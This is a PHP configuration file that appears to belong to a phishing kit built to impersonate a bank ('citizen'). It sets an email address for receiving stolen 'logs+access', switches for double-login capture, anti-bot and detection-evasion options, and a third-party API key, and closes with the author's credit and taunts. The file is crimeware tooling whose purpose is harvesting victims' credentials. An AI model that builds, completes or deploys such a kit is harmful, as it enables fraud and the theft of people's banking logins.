<?php


// SPAM INFO

$yourname = "Blueprint";
$your_email = ""; // logs+access

//ADMIN LOGIN INFO

$username = "ad";
$password = "ad";
$pin = "645345343256451"; 
// Redirect

$redirect = "citizen";


// ON / OFF 
$double_login = "on";
$double_access = "on";
$zsec_p = "on"; //on-off
$bots = "on"; // other bots

// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

//do not change anything unless you want to dead antibots
$add = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]"; //server checker DO NOT CAHNGE
$keyy = "NTU2Njg4NTU"; //zsec confirmation key
$api = "BUAIpsfLVxuY3Bf2RrGyNVYBkiLSyX9Tl84DsgDj"; //zsec api
$exiturl = $add; //server url

?>